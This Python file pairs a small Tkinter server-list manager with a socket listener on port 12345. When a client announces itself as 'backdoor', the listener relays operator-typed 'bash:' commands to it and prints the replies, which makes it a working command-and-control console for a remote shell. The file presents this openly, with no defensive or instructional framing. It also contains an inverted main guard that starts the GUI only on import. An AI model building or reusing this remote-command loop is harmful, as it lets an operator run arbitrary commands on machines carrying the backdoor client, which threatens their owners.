import socket

import time
import tkinter as tk
from tkinter import Listbox, Entry, Button, Scrollbar

class ServerManagementApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Server Management")

        self.servers = [{"name": "Server 1", "ip": "192.168.1.1"},
                        {"name": "Server 2", "ip": "192.168.1.2"},
                        {"name": "Server 3", "ip": "192.168.1.3"}]

        self.server_listbox = Listbox(root, selectmode=tk.SINGLE)
        self.update_server_listbox()

        self.server_name_entry = Entry(root)
        self.server_ip_entry = Entry(root)
        self.add_button = Button(root, text="Add Server", command=self.add_server)
        self.remove_button = Button(root, text="Remove Server", command=self.remove_server)

        self.server_listbox.grid(row=0, column=0, rowspan=4, padx=10, pady=10, sticky="nsew")
        self.server_name_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        self.server_ip_entry.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
        self.add_button.grid(row=2, column=1, padx=10, pady=5, sticky="ew")
        self.remove_button.grid(row=3, column=1, padx=10, pady=5, sticky="ew")

    def update_server_listbox(self):
        self.server_listbox.delete(0, tk.END)
        for server in self.servers:
            self.server_listbox.insert(tk.END, f"{server['name']} - {server['ip']}")

    def add_server(self):
        new_name = self.server_name_entry.get()
        new_ip = self.server_ip_entry.get()
        if new_name and new_ip:
            new_server = {"name": new_name, "ip": new_ip}
            self.servers.append(new_server)
            self.update_server_listbox()
            self.server_name_entry.delete(0, tk.END)
            self.server_ip_entry.delete(0, tk.END)

    def remove_server(self):
        selected_index = self.server_listbox.curselection()
        if selected_index:
            index = selected_index[0]
            del self.servers[index]
            self.update_server_listbox()

if __name__ != "__main__":
    root = tk.Tk()
    app = ServerManagementApp(root)
    root.mainloop()


def start_server():
    allowed_servers = ["127.0.0.1", "192.168.1.2"]
    server_host = '0.0.0.0'
    server_port = 12345

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_host, server_port))
    server_socket.listen(5)  # Permite hasta 5 conexiones en espera

    print("Esperando conexiones en", server_host, ":", server_port)
    
    while True:
        client_socket, client_address = server_socket.accept()
        client_ip = client_address[0]
        print("waiting")
        time.sleep(1)
        if client_ip in allowed_servers:
            print("Cliente conectado:", client_address)
            client_type = client_socket.recv(1024).decode("utf-8")
            if client_type == "backdoor":
                print(client_type)
                client_socket.send("conectado".encode("utf-8"))
                command = ""
                while command != "quit()":
                    command = input("bash: ")
                    client_socket.send(command.encode("utf-8"))
                    response = client_socket.recv(1024).decode("utf-8")
                    print(response)
            elif client_type == "videwall":
                print(client_type)
                with open(r'C:\Users\diher\Documents\Desarrollo\Python Scripts\client-servidor\servidor\image.png', 'rb') as img_file:
                    image_data = img_file.read()

                client_socket.send(image_data)
                print("Imagen enviada al cliente:", client_address)
                client_socket.send(b"Welcome to the server!\n")
                client_socket.close()
            else:
                print("SOLO")
                print(client_type)
        else:
            print(f"Rejected connection from {client_ip}")
            client_socket.send(b"Unauthorized access!\n")
            client_socket.close()

if __name__ == "__main__":
    start_server()
